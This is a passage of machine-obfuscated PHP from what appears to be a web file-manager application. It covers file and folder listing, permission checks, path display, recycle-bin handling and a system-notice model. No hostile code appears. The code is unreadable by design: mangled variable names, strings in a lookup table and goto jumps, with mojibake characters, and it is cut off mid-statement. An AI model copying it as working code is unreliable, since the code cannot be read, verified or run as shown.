$Ïû“Ú´…[$­Ì¨Ù®Æ[90]][$­Ì¨Ù®Æ[576]] = $this->shareFilterShow($¹ÃÚïí); } } } unset($Ïû“Ú´…); return $ ÕÓşÓ; } protected function shareFilterShow($ÎèßÏ) { $‰‹é“ô¿ =& $_SERVER[ïÃ°£«Ê]; if (!$ÎèßÏ) { return $ÎèßÏ; } $ÅÄ»ÖÆ = $‰‹é“ô¿[577]; if ($ÎèßÏ[$‰‹é“ô¿[578]] == $‰‹é“ô¿[91]) { $ÅÄ»ÖÆ .= $‰‹é“ô¿[579]; } if (is_array($ÎèßÏ[$‰‹é“ô¿[580]]) && is_array($ÎèßÏ[$‰‹é“ô¿[580]][$‰‹é“ô¿[581]])) { $ÎèßÏ[$‰‹é“ô¿[580]][$‰‹é“ô¿[581]] = $‰‹é“ô¿[582]; } if (!$Ô¾…à—û[$‰‹é“ô¿[583]] && $Ô¾…à—û[$‰‹é“ô¿[191]] != $‰‹é“ô¿[228]) { $Ô¾…à—û[$‰‹é“ô¿[583]] = KodIO::make($Ô¾…à—û[$‰‹é“ô¿[191]]); } $ÎèßÏ = array_field_key($ÎèßÏ, explode($‰‹é“ô¿[50], $ÅÄ»ÖÆ)); return $ÎèßÏ; } protected function _listAppendChildren(&$ê¸é’¶­, $Â¹½ó†›) { $´’´—¸Ã =& $_SERVER[ïÃ°£«Ê]; $é·¬½ì‚ = array(); $÷ùáş¬ = array($´’´—¸Ã[239] => 0, $´’´—¸Ã[240] => 0); foreach ($ê¸é’¶­ as &$êãÓÍ¨Ş) { if (!$êãÓÍ¨Ş[$´’´—¸Ã[500]]) { continue; } $é·¬½ì‚[] = intval($êãÓÍ¨Ş[$´’´—¸Ã[191]]); } unset($êãÓÍ¨Ş); if (!$é·¬½ì‚) { return; } $ä‘°€²› = array($´’´—¸Ã[190] => array($´’´—¸Ã[7], $é·¬½ì‚), $´’´—¸Ã[520] => 0); $¡·àß’³ = array($´’´—¸Ã[190], $´’´—¸Ã[500], $´’´—¸Ã[584] => $´’´—¸Ã[585]); $ûùÏö€ğ = $this->field($¡·àß’³)->where($ä‘°€²›)->group($´’´—¸Ã[586])->select(); $•Ç¯ÑÁ = array(); foreach ($ûùÏö€ğ as $ÚøÏğ‡) { $’—Æ˜“æ = $ÚøÏğ‡[$´’´—¸Ã[190]]; $üøòœ„ó = $ÚøÏğ‡[$´’´—¸Ã[500]] == $´’´—¸Ã[91] ? $´’´—¸Ã[240] : $´’´—¸Ã[239]; if (!isset($•Ç¯ÑÁ[$’—Æ˜“æ])) { $•Ç¯ÑÁ[$’—Æ˜“æ] = array($´’´—¸Ã[239] => 0, $´’´—¸Ã[240] => 0); } $•Ç¯ÑÁ[$’—Æ˜“æ][$üøòœ„ó] += $ÚøÏğ‡[$´’´—¸Ã[585]]; } foreach ($ê¸é’¶­ as &$êãÓÍ¨Ş) { if (!$êãÓÍ¨Ş[$´’´—¸Ã[500]]) { continue; } $î‡Œõ«× = is_array($•Ç¯ÑÁ[$êãÓÍ¨Ş[$´’´—¸Ã[191]]]) ? $•Ç¯ÑÁ[$êãÓÍ¨Ş[$´’´—¸Ã[191]]] : $÷ùáş¬; $êãÓÍ¨Ş[$´’´—¸Ã[240]] = $î‡Œõ«×[$´’´—¸Ã[240]]; $êãÓÍ¨Ş[$´’´—¸Ã[239]] = $î‡Œõ«×[$´’´—¸Ã[239]]; unset($êãÓÍ¨Ş[$´’´—¸Ã[501]]); } unset($êãÓÍ¨Ş); } protected function _listAppendAuth(&$íÃ÷Ñã) { $ï¼°ŒÎ– =& $_SERVER[ïÃ°£«Ê]; $­ øôÛ¤ = array(); foreach ($íÃ÷Ñã as $…ÏÎ÷æÒ) { if ($…ÏÎ÷æÒ[$ï¼°ŒÎ–[188]] == self::TYPE_GROUP) { $­ øôÛ¤[] = intval($…ÏÎ÷æÒ[$ï¼°ŒÎ–[191]]); } } if (!$­ øôÛ¤) { return; } $›ì²ØÄ„ = array_to_keyvalue($íÃ÷Ñã, $ï¼°ŒÎ–[191]); $³Ñ„ÀºÃ = Model($ï¼°ŒÎ–[587])->getSourceList($­ øôÛ¤, $›ì²ØÄ„); $ü”Ó»§ = KodUser::isRoot(); foreach ($íÃ÷Ñã as $­¥°±¼® => &$…ÏÎ÷æÒ) { $…ÏÎ÷æÒ[$ï¼°ŒÎ–[502]] = $³Ñ„ÀºÃ[$…ÏÎ÷æÒ[$ï¼°ŒÎ–[191]]]; if (!$…ÏÎ÷æÒ[$ï¼°ŒÎ–[502]] && $…ÏÎ÷æÒ[$ï¼°ŒÎ–[188]] == self::TYPE_GROUP) { $…ÏÎ÷æÒ[$ï¼°ŒÎ–[502]] = Action($ï¼°ŒÎ–[588])->pathGroupAuthMake($…ÏÎ÷æÒ[$ï¼°ŒÎ–[589]]); if (!$…ÏÎ÷æÒ[$ï¼°ŒÎ–[502]] && !$ü”Ó»§) { $…ÏÎ÷æÒ[$ï¼°ŒÎ–[233]] = !1; $…ÏÎ÷æÒ[$ï¼°ŒÎ–[232]] = !1; } } if ($…ÏÎ÷æÒ[$ï¼°ŒÎ–[502]]) { $…ÏÎ÷æÒ[$ï¼°ŒÎ–[233]] = AuthModel::authCheckEdit($…ÏÎ÷æÒ[$ï¼°ŒÎ–[502]][$ï¼°ŒÎ–[503]]); $…ÏÎ÷æÒ[$ï¼°ŒÎ–[232]] = AuthModel::authCheckView($…ÏÎ÷æÒ[$ï¼°ŒÎ–[502]][$ï¼°ŒÎ–[503]]); } $this->groupPathDisplay($…ÏÎ÷æÒ); } unset($…ÏÎ÷æÒ); } public function _listAppendAuthSecret(&$¤Ğ®«Í) { $¬Ä”ÑìÍ =& $_SERVER[ïÃ°£«Ê]; if (Model($¬Ä”ÑìÍ[522])->get($¬Ä”ÑìÍ[590]) != $¬Ä”ÑìÍ[91]) { return; } static $ï‚¤Â³Ö = false; if (!$ï‚¤Â³Ö) { $°‡Ç§Ñâ = Model($¬Ä”ÑìÍ[591]); $‹˜ÅÜ… = Model($¬Ä”ÑìÍ[592]); $ï‚¤Â³Ö = $‹˜ÅÜ…->listData(); $ï‚¤Â³Ö = array_to_keyvalue($ï‚¤Â³Ö, $¬Ä”ÑìÍ[191]); $ß¼ïƒµâ = json_decode(Model($¬Ä”ÑìÍ[522])->get($¬Ä”ÑìÍ[593]), !0); $ß¼ïƒµâ = array_to_keyvalue($ß¼ïƒµâ, $¬Ä”ÑìÍ[487]); foreach ($ï‚¤Â³Ö as $õËŞÁ°• => $ĞÛ·­óÒ) { $¶Şã© = $ß¼ïƒµâ[$ĞÛ·­óÒ[$¬Ä”ÑìÍ[594]]]; if (!$¶Şã©) { $‹˜ÅÜ…->remove($ĞÛ·­óÒ[$¬Ä”ÑìÍ[487]]); unset($ï‚¤Â³Ö[$õËŞÁ°•]); continue; } $îæœˆÂå = $°‡Ç§Ñâ->listData($¶Şã©[$¬Ä”ÑìÍ[502]]); if (!$îæœˆÂå) { $‹˜ÅÜ…->remove($ĞÛ·­óÒ[$¬Ä”ÑìÍ[487]]); unset($ï‚¤Â³Ö[$õËŞÁ°•]); continue; } $ĞÛ·­óÒ[$¬Ä”ÑìÍ[502]] = $îæœˆÂå; $ĞÛ·­óÒ[$¬Ä”ÑìÍ[595]] = $¶Şã©; $ĞÛ·­óÒ[$¬Ä”ÑìÍ[596]] = Model($¬Ä”ÑìÍ[597])->getInfoSimpleOuter($ĞÛ·­óÒ[$¬Ä”ÑìÍ[541]]); $ï‚¤Â³Ö[$õËŞÁ°•] = $ĞÛ·­óÒ; } } $‘ášò¶• = USER_ID; $ÑâšÚíŠ = array(); $ş³Ğ¯«† = $this->_listAppendPath($ÑâšÚíŠ, !0); foreach ($¤Ğ®«Í as $õËŞÁ°• => &$ĞÛ·­óÒ) { if (!is_array($ĞÛ·­óÒ[$¬Ä”ÑìÍ[502]])) { continue; } if ($ĞÛ·­óÒ[$¬Ä”ÑìÍ[188]] != $¬Ä”ÑìÍ[598]) { continue; } if (isset($ï‚¤Â³Ö[$ĞÛ·­óÒ[$¬Ä”ÑìÍ[191]]])) { $ÃíŞ˜¶æ = $ï‚¤Â³Ö[$ĞÛ·­óÒ[$¬Ä”ÑìÍ[191]]]; if (!is_array($ĞÛ·­óÒ[$¬Ä”ÑìÍ[555]])) { $ĞÛ·­óÒ[$¬Ä”ÑìÍ[555]] = array(); } $ĞÛ·­óÒ[$¬Ä”ÑìÍ[555]][$¬Ä”ÑìÍ[599]] = $ÃíŞ˜¶æ[$¬Ä”ÑìÍ[594]]; $ĞÛ·­óÒ[$¬Ä”ÑìÍ[502]][$¬Ä”ÑìÍ[600]] = $ÃíŞ˜¶æ; $ĞÛ·­óÒ[$¬Ä”ÑìÍ[502]][$¬Ä”ÑìÍ[601]] = $ĞÛ·­óÒ[$¬Ä”ÑìÍ[602]]; $ĞÛ·­óÒ[$¬Ä”ÑìÍ[502]][$¬Ä”ÑìÍ[603]] = $¬Ä”ÑìÍ[91]; if ($ÃíŞ˜¶æ[$¬Ä”ÑìÍ[541]] != $‘ášò¶•) { $ĞÛ·­óÒ[$¬Ä”ÑìÍ[502]][$¬Ä”ÑìÍ[503]] = $ĞÛ·­óÒ[$¬Ä”ÑìÍ[502]][$¬Ä”ÑìÍ[503]] & $ÃíŞ˜¶æ[$¬Ä”ÑìÍ[502]][$¬Ä”ÑìÍ[502]]; } continue; } $Ì‚˜ô‘ü = $this->parentLevelArray($ĞÛ·­óÒ[$¬Ä”ÑìÍ[604]]); $„ĞŸ˜ñ = array_reverse($Ì‚˜ô‘ü); foreach ($„ĞŸ˜ñ as $Ÿ¤ÑÒå => $×ÑˆËğ‹) { if (!isset($ï‚¤Â³Ö[$×ÑˆËğ‹])) { continue; } $ÃíŞ˜¶æ = $ï‚¤Â³Ö[$×ÑˆËğ‹]; $ĞÛ·­óÒ[$¬Ä”ÑìÍ[502]][$¬Ä”ÑìÍ[600]] = $ÃíŞ˜¶æ; if ($ÃíŞ˜¶æ[$¬Ä”ÑìÍ[541]] != $‘ášò¶•) { $ĞÛ·­óÒ[$¬Ä”ÑìÍ[502]][$¬Ä”ÑìÍ[503]] = $ĞÛ·­óÒ[$¬Ä”ÑìÍ[502]][$¬Ä”ÑìÍ[503]] & $ÃíŞ˜¶æ[$¬Ä”ÑìÍ[502]][$¬Ä”ÑìÍ[502]]; } $çÁ—â½­ = $¬Ä”ÑìÍ[12]; $è€ğ¢Æ÷ = count($Ì‚˜ô‘ü) - $Ÿ¤ÑÒå; for ($çíš˜åÙ = 0; $çíš˜åÙ < $è€ğ¢Æ÷; $çíš˜åÙ++) { if (!isset($ş³Ğ¯«†[$Ì‚˜ô‘ü[$çíš˜åÙ]])) { $çÁ—â½­ = $¬Ä”ÑìÍ[12]; break; } $çÁ—â½­ = $çÁ—â½­ . rtrim($ş³Ğ¯«†[$Ì‚˜ô‘ü[$çíš˜åÙ]], $¬Ä”ÑìÍ[8]) . $¬Ä”ÑìÍ[8]; } $ĞÛ·­óÒ[$¬Ä”ÑìÍ[502]][$¬Ä”ÑìÍ[601]] = rtrim($çÁ—â½­, $¬Ä”ÑìÍ[8]) . $¬Ä”ÑìÍ[8]; break; } } unset($ĞÛ·­óÒ); } public function groupPathDisplay(&$ŠÆ§á´») { $ÀÎÂÜú• =& $_SERVER[ïÃ°£«Ê]; if ($ŠÆ§á´»[$ÀÎÂÜú•[188]] != self::TYPE_GROUP) { return; } $ÉÖ¾­¸í = Model($ÀÎÂÜú•[605])->getInfo($ŠÆ§á´»[$ÀÎÂÜú•[589]]); $¬ò£÷±ˆ = $this->parentLevelArray($ÉÖ¾­¸í[$ÀÎÂÜú•[604]]); $öëÄóÜ = $ÀÎÂÜú•[12]; foreach ($¬ò£÷±ˆ as $ŒÆ††±À) { $³ğì© = Model($ÀÎÂÜú•[605])->getInfo($ŒÆ††±À); $öëÄóÜ .= $³ğì©[$ÀÎÂÜú•[90]][$ÀÎÂÜú•[191]] . $ÀÎÂÜú•[50]; } $ŠÆ§á´»[$ÀÎÂÜú•[606]] = $ÉÖ¾­¸í[$ÀÎÂÜú•[190]]; $ŠÆ§á´»[$ÀÎÂÜú•[607]] = $ÉÖ¾­¸í[$ÀÎÂÜú•[604]]; $ŠÆ§á´»[$ÀÎÂÜú•[608]] = $ÉÖ¾­¸í[$ÀÎÂÜú•[609]]; $ŠÆ§á´»[$ÀÎÂÜú•[610]] = $öëÄóÜ . $ÉÖ¾­¸í[$ÀÎÂÜú•[90]][$ÀÎÂÜú•[191]]; } protected function _listAppendPath(&$µ°¸óœ¸, $×³Â¼‘ = false) { $«êÅ³İ¦ =& $_SERVER[ïÃ°£«Ê]; static $Òô„ª¯¬ = array(); $Ã¡¥ƒ¶Ó = array(); $ÍåÅ’¥´ = array(); if ($×³Â¼‘) { return $Òô„ª¯¬; } foreach ($µ°¸óœ¸ as &$óºÜ¬õŸ) { $„¨¯ˆø® = $óºÜ¬õŸ[$«êÅ³İ¦[191]]; if ($óºÜ¬õŸ[$«êÅ³İ¦[500]] == $«êÅ³İ¦[91] && $óºÜ¬õŸ[$«êÅ³İ¦[190]] != 0) { $Òô„ª¯¬[$„¨¯ˆø®] = $óºÜ¬õŸ[$«êÅ³İ¦[32]]; } if ($óºÜ¬õŸ[$«êÅ³İ¦[500]] == $«êÅ³İ¦[91] && $óºÜ¬õŸ[$«êÅ³İ¦[190]] == 0) { $Òô„ª¯¬[$„¨¯ˆø®] = $this->_listAppendPathRoot($óºÜ¬õŸ, array()); } if (isset($ÍåÅ’¥´[$óºÜ¬õŸ[$«êÅ³İ¦[604]]])) { continue; } $ÍåÅ’¥´[$óºÜ¬õŸ[$«êÅ³İ¦[604]]] = !0; $ËƒÌ¤­ú = $this->parentLevelArray($óºÜ¬õŸ[$«êÅ³İ¦[604]]); foreach ($ËƒÌ¤­ú as $´¦‘àÀ => $µ‰áá¹´) { if (isset($Òô„ª¯¬[$µ‰áá¹´])) { continue; } if ($´¦‘àÀ == 0) { $Òô„ª¯¬[$µ‰áá¹´] = $this->_listAppendPathRoot($óºÜ¬õŸ, $ËƒÌ¤­ú); } if ($´¦‘àÀ != 0) { $Ã¡¥ƒ¶Ó[] = $µ‰áá¹´; } } } unset($óºÜ¬õŸ); $Ã¡¥ƒ¶Ó = array_unique($Ã¡¥ƒ¶Ó); if (count($Ã¡¥ƒ¶Ó) > 0) { $Î‘Ï‰• = array($«êÅ³İ¦[506] => array($«êÅ³İ¦[507], $Ã¡¥ƒ¶Ó)); if (count($Ã¡¥ƒ¶Ó) == 1) { $¾Ì¶Æâ² = $this->sourceInfo($Ã¡¥ƒ¶Ó[0]); $Óè¤» = is_array($¾Ì¶Æâ²) ? array($¾Ì¶Æâ²) : !1; } else { $Óè¤» = $this->field($«êÅ³İ¦[611])->where($Î‘Ï‰•)->select(); } if (!$Óè¤») { $Óè¤» = array(); } foreach ($Óè¤» as $Ë¬š—ğ«) { $Òô„ª¯¬[$Ë¬š—ğ«[$«êÅ³İ¦[191]]] = $Ë¬š—ğ«[$«êÅ³İ¦[32]]; } } $¤ı€—ââ = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); $µßáŠè§ = array(); foreach ($µ°¸óœ¸ as &$óºÜ¬õŸ) { $Æ…ğ¿æŸ = $óºÜ¬õŸ[$«êÅ³İ¦[604]]; $›ÄÕñ›ç = $«êÅ³İ¦[12]; if (isset($µßáŠè§[$Æ…ğ¿æŸ])) { $›ÄÕñ›ç = $µßáŠè§[$Æ…ğ¿æŸ]; } else { $ËƒÌ¤­ú = $this->parentLevelArray($óºÜ¬õŸ[$«êÅ³İ¦[604]]); foreach ($ËƒÌ¤­ú as $´¦‘àÀ => $µ‰áá¹´) { if (isset($Òô„ª¯¬[$µ‰áá¹´])) { $›ÄÕñ›ç .= $Òô„ª¯¬[$µ‰áá¹´] . $«êÅ³İ¦[8]; } } $µßáŠè§[$Æ…ğ¿æŸ] = $›ÄÕñ›ç; } $›ÄÕñ›ç .= $óºÜ¬õŸ[$«êÅ³İ¦[32]]; if ($óºÜ¬õŸ[$«êÅ³İ¦[500]] == $«êÅ³İ¦[91]) { $›ÄÕñ›ç .= $«êÅ³İ¦[8]; } $óºÜ¬õŸ[$«êÅ³İ¦[602]] = str_replace($«êÅ³İ¦[254], $«êÅ³İ¦[8], $›ÄÕñ›ç); if ($óºÜ¬õŸ[$«êÅ³İ¦[190]] == $«êÅ³İ¦[228]) { $óºÜ¬õŸ[$«êÅ³İ¦[32]] = trim($Òô„ª¯¬[$óºÜ¬õŸ[$«êÅ³İ¦[191]]], $«êÅ³İ¦[8]); $óºÜ¬õŸ[$«êÅ³İ¦[602]] = $óºÜ¬õŸ[$«êÅ³İ¦[32]] . $«êÅ³İ¦[8]; } if (intval($óºÜ¬õŸ[$«êÅ³İ¦[188]]) == self::TYPE_SYSTEM) { $this->_listAppendPathRecycle($óºÜ¬õŸ, $ËƒÌ¤­ú, $¤ı€—ââ); } } unset($óºÜ¬õŸ); return $µ°¸óœ¸; } private function _listAppendPathRecycle(&$çß‰•†û, $şääâÉ™, $¼„ıõ‡) { $à¥›æÜ =& $_SERVER[ïÃ°£«Ê]; if (!in_array($¼„ıõ‡, $şääâÉ™) && $çß‰•†û[$à¥›æÜ[191]] != $¼„ıõ‡) { return; } $ŠÆ¥“…¢ = explode($à¥›æÜ[8], trim($çß‰•†û[$à¥›æÜ[602]], $à¥›æÜ[8])); $„‡¯ÒˆÌ = implode($à¥›æÜ[8], array_slice($ŠÆ¥“…¢, 2)); $çß‰•†û[$à¥›æÜ[602]] = $à¥›æÜ[8] . LNG($à¥›æÜ[612]) . $à¥›æÜ[8] . ltrim($„‡¯ÒˆÌ, $à¥›æÜ[8]); $çß‰•†û[$à¥›æÜ[604]] = $à¥›æÜ[613] . implode($à¥›æÜ[50], array_slice($şääâÉ™, 1)) . $à¥›æÜ[50]; if ($çß‰•†û[$à¥›æÜ[191]] == $¼„ıõ‡) { $çß‰•†û[$à¥›æÜ[604]] = $à¥›æÜ[613]; $çß‰•†û[$à¥›æÜ[190]] = $à¥›æÜ[228]; $çß‰•†û[$à¥›æÜ[32]] = LNG($à¥›æÜ[612]); } $çß‰•†û[$à¥›æÜ[614]] = $à¥›æÜ[615]; } protected function _listAppendPathRoot(&$ Ğí™¡°, $¼ËÓ£‘) { $ËÒ±‹åš =& $_SERVER[ïÃ°£«Ê]; static $ˆË¦÷­ = false; static $±–Î”Ê¦ = false; $›¥£ëè‡ = $ËÒ±‹åš[12]; if ($ Ğí™¡°[$ËÒ±‹åš[188]] == self::TYPE_USER) { if ($ Ğí™¡°[$ËÒ±‹åš[589]] == USER_ID) { $›¥£ëè‡ = LNG($ËÒ±‹åš[616]); if ($ˆË¦÷­ === !1) { $›ƒ£§ïä = Model($ËÒ±‹åš[617])->getInfoFull(USER_ID); $ˆË¦÷­ = _get($›ƒ£§ïä, $ËÒ±‹åš[618], $ËÒ±‹åš[12]); } if ($±–Î”Ê¦ === !1) { $›ƒ£§ïä = Model($ËÒ±‹åš[617])->getInfoFull(USER_ID); $±–Î”Ê¦ = _get($›ƒ£§ïä, $ËÒ±‹åš[619], $ËÒ±‹åš[12]); } if ($¼ËÓ£‘ && $¼ËÓ£‘[0] == $ˆË¦÷­ || !$¼ËÓ£‘ && $ Ğí™¡°[$ËÒ±‹åš[191]] == $ˆË¦÷­) { $›¥£ëè‡ = LNG($ËÒ±‹åš[620]); $ Ğí™¡°[$ËÒ±‹åš[621]] = $ËÒ±‹åš[622]; } if ($¼ËÓ£‘ && $¼ËÓ£‘[0] == $±–Î”Ê¦ || !$¼ËÓ£‘ && $ Ğí™¡°[$ËÒ±‹åš[191]] == $±–Î”Ê¦) { $›¥£ëè‡ = $›¥£ëè‡ . $ËÒ±‹åš[623] . LNG($ËÒ±‹åš[624]); } if (!$¼ËÓ£‘) { $ Ğí™¡°[$ËÒ±‹åš[32]] = $›¥£ëè‡; } } else { $›ƒ£§ïä = Model($ËÒ±‹åš[617])->getInfoFull($ Ğí™¡°[$ËÒ±‹åš[589]]); $ªÕö¹‹ = _get($›ƒ£§ïä, $ËÒ±‹åš[619], $ËÒ±‹åš[12]); $ Ğí™¡°[$ËÒ±‹åš[625]] = Model($ËÒ±‹åš[597])->getInfoSimpleOuter($ Ğí™¡°[$ËÒ±‹åš[589]]); $›¥£ëè‡ = LNG($ËÒ±‹åš[626]) . $ËÒ±‹åš[173] . $ Ğí™¡°[$ËÒ±‹åš[625]][$ËÒ±‹åš[32]] . $ËÒ±‹åš[175]; if ($¼ËÓ£‘ && $¼ËÓ£‘[0] == $ªÕö¹‹ || !$¼ËÓ£‘ && $ Ğí™¡°[$ËÒ±‹åš[191]] == $ªÕö¹‹) { $›¥£ëè‡ = LNG($ËÒ±‹åš[626]) . $ËÒ±‹åš[627] . $ Ğí™¡°[$ËÒ±‹åš[625]][$ËÒ±‹åš[32]] . $ËÒ±‹åš[623] . LNG($ËÒ±‹åš[624]) . $ËÒ±‹åš[175]; } } } else { if ($ Ğí™¡°[$ËÒ±‹åš[188]] == self::TYPE_GROUP) { $„õ¡¹ê = Model($ËÒ±‹åš[605])->getInfoSimple($ Ğí™¡°[$ËÒ±‹åš[589]]); $›¥£ëè‡ = $„õ¡¹ê[$ËÒ±‹åš[32]]; } else { if ($ Ğí™¡°[$ËÒ±‹åš[188]] == self::TYPE_SYSTEM) { $›¥£ëè‡ = $ËÒ±‹åš[628]; } } } $›¥£ëè‡ = $›¥£ëè‡ ? $ËÒ±‹åš[8] . $›¥£ëè‡ . $ËÒ±‹åš[8] : $ËÒ±‹åš[8]; return $›¥£ëè‡; } protected function _listAppendUser(&$Ê¥Ãöé) { $åİÆîá =& $_SERVER[ïÃ°£«Ê]; $ëº¢çÎ‚ = array_to_keyvalue($Ê¥Ãöé, $åİÆîá[12], $åİÆîá[541]); $ï†ËÌìƒ = array_to_keyvalue($Ê¥Ãöé, $åİÆîá[12], $åİÆîá[543]); $ÌºËæá = array_merge($ëº¢çÎ‚, $ï†ËÌìƒ); $‚º‰®Œ = Model($åİÆîá[617])->userListInfo($ÌºËæá); foreach ($Ê¥Ãöé as &$¦Ğä‡ñ) { $®¶Ç—ö = $¦Ğä‡ñ[$åİÆîá[541]]; $¦Ğä‡ñ[$åİÆîá[541]] = $‚º‰®Œ[$®¶Ç—ö] ? $‚º‰®Œ[$®¶Ç—ö] : !1; $®¶Ç—ö = $¦Ğä‡ñ[$åİÆîá[543]]; $¦Ğä‡ñ[$åİÆîá[543]] = $‚º‰®Œ[$®¶Ç—ö] ? $‚º‰®Œ[$®¶Ç—ö] : !1; if (_get($¦Ğä‡ñ, $åİÆîá[629], 0)) { $ÎÌêã†À = $GLOBALS[$åİÆîá[6]][$åİÆîá[92]][$åİÆîá[630]]; if ($¦Ğä‡ñ[$åİÆîá[555]][$åİÆîá[631]] <= time() - $ÎÌêã†À) { $this->metaSet($¦Ğä‡ñ[$åİÆîá[191]], $åİÆîá[632], null); $this->metaSet($¦Ğä‡ñ[$åİÆîá[191]], $åİÆîá[631], null); unset($¦Ğä‡ñ[$åİÆîá[555]][$åİÆîá[632]]); continue; } $¦ûæ½é = $¦Ğä‡ñ[$åİÆîá[555]][$åİÆîá[632]]; $¦Ğä‡ñ[$åİÆîá[555]][$åİÆîá[633]] = Model($åİÆîá[617])->getInfoSimpleOuter($¦ûæ½é); } } unset($¦Ğä‡ñ); } public function parentLevelArray($’òêšÉ) { $ÚÔ²®“× =& $_SERVER[ïÃ°£«Ê]; $’òêšÉ = explode($ÚÔ²®“×[50], trim($’òêšÉ, $ÚÔ²®“×[50])); return array_to_int(array_filter($’òêšÉ)); } public function listAll($‡¯Ã• é) { $õ¦±¹ =& $_SERVER[ïÃ°£«Ê]; $úíË½¬³ = $this->sourceInfo($‡¯Ã• é); $¬œÖÃØÌ = array($õ¦±¹[634] => array($õ¦±¹[635], $úíË½¬³[$õ¦±¹[604]] . $‡¯Ã• é . $õ¦±¹[636]), $õ¦±¹[637] => 0); $Š¢À÷‡Ü = $õ¦±¹[638]; $ÁêÂüÄ° = "\x4c\x45\x46\x54\40\112\x4f\x49\x4e\x20{$this->tablePrefix}\151\x6f\137\146\151\154\145\40\146\151\154\145\x20\157\x6e\40\x73\x6f\165\162\143\x65\56\146\151\154\145\111\104\x20\75\40\x66\x69\154\x65\56\146\151\154\145\x49\x44"; $™•“¤äõ = $this->alias($õ¦±¹[533])->field($Š¢À÷‡Ü)->where($¬œÖÃØÌ)->join($ÁêÂüÄ°)->select(); $this->_listAppendAuth($™•“¤äõ); $this->_listAppendUser($™•“¤äõ); $this->_listAppendPath($™•“¤äõ); $™•“¤äõ = array_to_keyvalue($™•“¤äõ, $õ¦±¹[191]); $ÓóÓ¶ÌŞ = "\x2f{$úíË½¬³[$õ¦±¹[32]]}\57"; $ÓóÓ¶ÌŞ = $ÓóÓ¶ÌŞ == $õ¦±¹[254] ? $õ¦±¹[8] : $ÓóÓ¶ÌŞ; $¿½Ç»×Û = array(); foreach ($™•“¤äõ as $®ğó¬’æ => $«ÉŸ×ªû) { $¥”ºº÷ü = $this->parentLevelArray($«ÉŸ×ªû[$õ¦±¹[604]]); array_shift($¥”ºº÷ü); $Â˜î«É = $ÓóÓ¶ÌŞ; for ($²ş°‹«à = 0; $²ş°‹«à < count($¥”ºº÷ü); $²ş°‹«à++) { $Â˜î«É .= $™•“¤äõ[$¥”ºº÷ü[$²ş°‹«à]][$õ¦±¹[32]] . $õ¦±¹[8]; } $Â˜î«É .= $«ÉŸ×ªû[$õ¦±¹[32]]; if ($«ÉŸ×ªû[$õ¦±¹[500]]) { $Â˜î«É .= $õ¦±¹[8]; } $ıÜñ‚ø = array($õ¦±¹[510] => str_replace($õ¦±¹[254], $õ¦±¹[8], str_replace($õ¦±¹[254], $õ¦±¹[8], str_replace($õ¦±¹[254], $õ¦±¹[8], $Â˜î«É))), $õ¦±¹[639] => intval($«ÉŸ×ªû[$õ¦±¹[500]]), $õ¦±¹[640] => intval($«ÉŸ×ªû[$õ¦±¹[79]]), $õ¦±¹[88] => intval($«ÉŸ×ªû[$õ¦±¹[88]]), $õ¦±¹[90] => $this->pathInfoFilter($«ÉŸ×ªû)); if (!$ıÜñ‚ø[$õ¦±¹[500]]) { $ıÜñ‚ø[$õ¦±¹[557]] = $«ÉŸ×ªû[$õ¦±¹[557]]; } $¿½Ç»×Û[] = $ıÜñ‚ø; } $¿½Ç»×Û = array_sort_by($¿½Ç»×Û, $õ¦±¹[87]); return $¿½Ç»×Û; } } goto d²õ˜İ¼ –; C“•¼”Å…: define($_SERVER[ïÃ°£«Ê][317], 3); define($_SERVER[ïÃ°£«Ê][318], 1); define($_SERVER[ïÃ°£«Ê][319], 0); goto DË­êğİ‡Ğ; a¢åà¥×: class SystemNoticeModel extends ModelBaseLight { public $optionType = "\x53\171\x73\164\x65\155\56\x6e\x6f\164\151\143\145\114\x69\x73\164"; public $field = array("\x6e\x61\x6d\x65", "\143\157\156\164\x65\x6e\164", "\x61\165\x74\x68", "\155\157\144\145", "\x74\x69\x6d\x65", "\164\x79\160\145", "\x6c\x65\166\x65\x6c", "\x65\156\141\142\154\145", "\x73\x6f\x72\164"); public function listData($´õš™… = false, $æ­ò¡‡ò = "\x73\x6f\x72\164", $¯›ø„¢Ş = false) { return parent::listData($´õš™…, $æ­ò¡‡ò, $¯›ø„¢Ş); } public function add($ã©ÔÄ½à) { $‰÷ƒÓ =& $_SERVER[ïÃ°£«Ê]; $ĞìößÓ = time(); if ($ã©ÔÄ½à[$‰÷ƒÓ[16]] == $‰÷ƒÓ[2658]) { $ĞìößÓ = strtotime($ã©ÔÄ½à[$‰÷ƒÓ[204]]); } $ã©ÔÄ½à[$‰÷ƒÓ[204]] = $ĞìößÓ; return parent::insert($ã©ÔÄ½à); } public function update($¬³Â€Ÿ, $’Â‹“áØ) { $ùó–ÜÒò =& $_SERVER[ïÃ°£«Ê]; $À›šÇ‘ö = $this->listData($¬³Â€Ÿ); if (!$À›šÇ‘ö) { return !1; } $¹ êÛĞú = time(); if ($’Â‹“áØ[$ùó–ÜÒò[16]] == $ùó–ÜÒò[2658]) { $¹ êÛĞú = strtotime($’Â‹“áØ[$ùó–ÜÒò[204]]); } $’Â‹“áØ[$ùó–ÜÒò[204]] = $¹ êÛĞú; return parent::update($¬³Â€Ÿ, $’Â‹“áØ); } public function remove($¬ªà™¬Ô) { $•ÁşòËĞ = $this->listData($¬ªà™¬Ô); if (!$•ÁşòËĞ || $•ÁşòËĞ[$_SERVER[ïÃ°£«Ê][189]]) { return !1; } return parent::remove($¬ªà™¬Ô); } public function sort($¢×âîâÖ, $ÕÏÁëîş) { return parent::update($¢×âîâÖ, $ÕÏÁëîş); } public function enable($Â”¡“¾ñ, $ŒÈ±ˆèÊ) { return parent::update($Â”¡“¾ñ, array($_SERVER[ïÃ°£«Ê][2659] => $ŒÈ±ˆèÊ)); } private function initUserOption() { $Âûä©“á =& $_SERVER[ïÃ°£«Ê]; $this->optionType = $Âûä©“á[2660]; $this->modelType = $Âûä©“á[2661]; $this->field = array($Âûä©“á[2662], $Âûä©“á[32], $Âûä©“á[204], $Âûä©“á[33], $Âûä©“á[2663], $Âûä©“á[851], $Âûä©“á[226]); } public function userNoticeGet($¸öÒ¦ğø = false) { $this->initUserOption(); return parent::listData($¸öÒ¦ğø, $_SERVER[ïÃ°£«Ê][487], !0); } public function userNoticeAdd($ëÓ–‘Üµ) { $Ÿ“Å”¢ =& $_SERVER[ïÃ°£«Ê]; $this->initUserOption(); $¨‘×î»£ = $this->findByKey($Ÿ“Å”¢[2662], $ëÓ–‘Üµ[$Ÿ“Å”¢[487]]); if ($¨‘×î»£) { return !0; } $Æ™±œÍ = array($Ÿ“Å”¢[2662] => 